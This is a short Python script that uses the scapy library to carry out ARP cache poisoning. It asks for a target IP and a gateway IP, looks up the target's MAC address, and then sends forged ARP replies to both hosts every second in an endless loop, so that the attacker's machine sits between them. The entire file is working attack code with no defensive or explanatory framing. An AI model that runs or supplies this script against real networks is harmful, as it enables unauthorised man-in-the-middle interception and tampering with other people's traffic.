import time
import sys
from scapy.all import ARP, Ether, srp, send
 
 
def retMac(IP):
    ARP_Packet = ARP(pdst=IP)
    ARP_Ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    ARP_Broadcast = ARP_Ether / ARP_Packet
    Reply = srp(ARP_Broadcast, timeout=1, verbose=False)[0]
    for Packet in Reply:
        return Packet[1].hwsrc
 
 
def ARP_Attack(T_IP, S_IP):
    Poison_Packet = ARP(op=2, pdst=T_IP, hwdst=retMac(T_IP), psrc=S_IP)
    send(Poison_Packet, verbose=False)
    print('Packet sent to ', T_IP, ' from ', S_IP)
 
 
TARGET = input('Enter Target IP: ') 
GATEWAY = input('Enter Gateway IP: ') 

print('Sending ARP Packets...')
while True:
    ARP_Attack(TARGET, GATEWAY)
    ARP_Attack(GATEWAY, TARGET)
    time.sleep(1)